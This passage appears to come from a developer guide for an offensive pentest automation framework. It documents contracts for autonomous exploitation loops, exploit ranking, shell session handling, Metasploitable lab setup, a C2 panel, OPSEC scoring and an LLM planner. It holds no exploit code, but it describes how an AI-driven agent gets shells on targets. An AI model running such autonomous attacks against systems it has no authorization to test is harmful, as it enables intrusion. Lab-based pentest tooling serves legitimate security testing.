- Preflight (`modules/loop_preflight.py`): `check_target` maps to a lab
  scenario (`modules.lab_runtime`) — a stopped/missing gym fails with the
  recovery command; a non-lab target passes on an open or refused port,
  fails only when fully filtered. `auto_loop --no-preflight` overrides;
  `auto_pwn` aborts on a down lab target. Never raises; I/O injectable.
- Honest exit (`modules/lazy_runner.py`): `loop_exit_code` returns 0 only
  for `done`/`pentest_proven` with a non-failed verdict (4 timeout, 1
  otherwise); `write_loop_result` persists `result.json` to
  `sessions/loops/<id>/` (or `sessions/loop_result_<task>.json`);
  `autonomous_exit_gate` raises `SystemExit` under `LAZYOWN_AUTONOMOUS=1`
  (interactive shells unaffected).
- Reap (`modules/loop_manager.py`): `_reap` reads the workspace
  `result.json`, finalizing `finished` only on real success, else
  `failed`/`stopped`, with a refreshed `metadata.json`.
- Audit (`modules/loop_audit.py`): one append-only JSONL per task
  (`sessions/lazy/audit_<task>.jsonl`); every executed and gate-blocked
  step is recorded via `build_executor`+`step_context` (worker, intent,
  guard verdict, judge, opsec, duration, output tail) and bracketed by
  lifecycle events; `render`/`list_runs`. CLI:
  `loop_audit list|latest|<task>`. Capped at `AUDIT_MAX_RECORDS`.
- Gym cleanup opt-in (`modules/gym_cleanup.py`): stops
  `lazyown-lab-*`/`-range-*` only with `"gym_cleanup_on_exit": true` AND
  an interactive shell; autonomous/`-c`/`--run-chain` never stop them.
- auto_pwn success (`modules/ctf_capture.evaluate_exploit_output`): a
  genuine shell or shell-objective capture only — banners, long output
  and `key: value` lines never count. `autonomous_exploit_engine.`
  `_heuristic_match` uses `max(heuristic, yaml_score)` and
  `rank_exploits` dedupes by (strategy, cve, service).
  `Planner._initial_access_candidate` always emits one exploitation
  intent so `auto_pwn <target>` runs even with every LLM down
  (`AUTO_PWN_MIN_TIMEOUT_SEC` 900s). `LazyLoopEngine._evaluate_goal`
  counts confirmed findings from `sessions/findings/<task>.jsonl`.

Tests: `tests/test_{loop_preflight,loop_exit_gate,loop_manager_outcome,`
`loop_audit,gym_cleanup_policy,auto_pwn_success,planner_initial_access}.py`.

## 15m. Metasploitable 2 gym setup contracts

Operator setup guide: [`docs/gym-setup.md`](docs/gym-setup.md). Contracts:

- `modules/metasploitable_migrations.py` — idempotent migrations applied on every `lab start metasploitable` (wired in `cli/commands/lab.py::_lab_start`); each step `check` then argv-form `docker exec` `apply`; subnet prefix defaults to `172.17.0.`. Tests: `tests/test_metasploitable_migrations.py`.
- `modules/world_model._master_password()` — resolution order env `LAZYOWN_MASTER_PASSWORD` → OS keyring → device secret → none (no predictable key), shared with `cli/auto_crypto`; MCP subprocesses and background loops decrypt `sessions/world_model.json.encrypted` with no extra config, and legacy archives stay readable.
- `modules/atomic_exploit_bridge.py` — per-vector shells: `_ShellSession.owner` + `_PORT_OWNERS` block cross-vector `(target, port)` adoption; `live_sessions()` exposes the owner; `close_sessions` releases claims.
- Browser specs (`ms2_dvwa_xss_dom`, `ms2_twiki_xss`, `ms2_mutillidae_csrf`) run the system interpreter explicitly and need chromium + chromedriver + selenium.
- Verified: 42/45 vectors yield a shell; `ms2_dns_recursion`, `ms2_nfs_exports`, `ms2_rlogin_trust` fail inside Docker by design.

---
## 16. Killchain Gap Contracts (v3 — unified killchain)

Full per-file contracts: [`docs/killchain_contracts.md`](docs/killchain_contracts.md). Kill-chain data comes ONLY from `modules/killchain.py`; every display surface consumes its `snapshot()`. Session state travels through `modules/world_model` (transparent decrypt of `world_model.json.encrypted`).

## 16a. LLM + OPSEC consolidation contracts

Full contracts: [`docs/refactor_contracts.md`](docs/refactor_contracts.md). LLM backends go through `modules/llm_factory`; OPSEC scoring lives in one `modules/opsec_scorer.py`.

### 16a.1 LLM prompt/knowledge layer contract

Prompt templates + KB live in ONE pure contract `modules/llm_prompts.py`; the Groq facade `modules/llm_adapter.py` consumes it and MUST NOT import `modules.legacy.lazygptcli*` (AST watchdog `tests/test_llm_legacy_isolation.py`). Full spec: [`docs/llm_prompt_contract.md`](docs/llm_prompt_contract.md).

## 16b. Lint contract — `ruff check .` is green (SDD+TDD+BDD gate)

Full contract: `docs/lint_contract.md`. Summary: `ruff check .` zero errors; generated code (`mutants/`) excluded; `ruff format --check` required green only on touched files; do NOT reformat untouched legacy god classes.


## 16c. Orchestrator visibility contracts

One file per contract, each with a test (+ mutation runner): verb catalog
`modules/verb_catalog.py` + `config/verbs.yaml`; trigger policy
`modules/trigger_policy.py` (`triggers:` in `config/orchestrator.yaml`); trigger extraction
`modules/loop_triggers.py`; planner allow-list `modules/lazy_cli_bridge.py::catalog_cli_for_phase`
(wired in `lazy_loop.build_prompt_context`); TUI `cli/orchestrator_assets_tabs.py` +
`cli/lazy_orchestrator.py`; toastr `cli/toast_bus.py`; startup brief `cli/session_brief.py`
(wired in `lazyown.preloop`); C2 panel `lazyc2/blueprints/orchestrator.py` +
`templates/orchestrator_panel.html` (mirror `GET /api/v1/orchestrator/panel.json`).

Rules: toggles write `config/verbs.yaml` (`verb_catalog.set_enabled`); registry management via
`cli/commands/verb_admin.py` (`verb` command); trigger CLI `lazy_trigger list|add|remove|on|off|seed|policy|addons|sync`;
the planner sees only catalog-enabled verbs for the current phase (fail-closed).


## 16. Read next

- `QUICKSTART.md` — start here for a new operator session.
- `docs/quality_gates.md` — mutation, BDD, contract manifest, journal gates.
- `README.md` — public feature list (auto-regenerated by `DEPLOY.sh`).
- `COMMANDS.md`, `UTILS.md`, `CHANGELOG.md` — auto-generated references.
- `skills/lazyown.md` — MCP playbook (mandatory before MCP session).
- `skills/README.md` — skills architecture + 194 MCP tools.
- `<dir>/README.md` — every directory; read before editing.

When in doubt: read `payload.json` → `sessions/` → directory's `README.md` → then write code.

<!-- readmenator-agent-kb-link -->
## Project Knowledge Base

Generated offline by [ReadMenator](https://github.com/grisuno/ReadMenator). Agents: follow the knowledge-base protocol in `AGENTS.md` (`readmenator . fresh`, `readmenator-agent/MEMORY.md`, `readmenator-agent/INDEX*.md`, `readmenator . ask`). Humans: `KNOWLEDGE_BASE.md`.
<!-- /readmenator-agent-kb-link -->
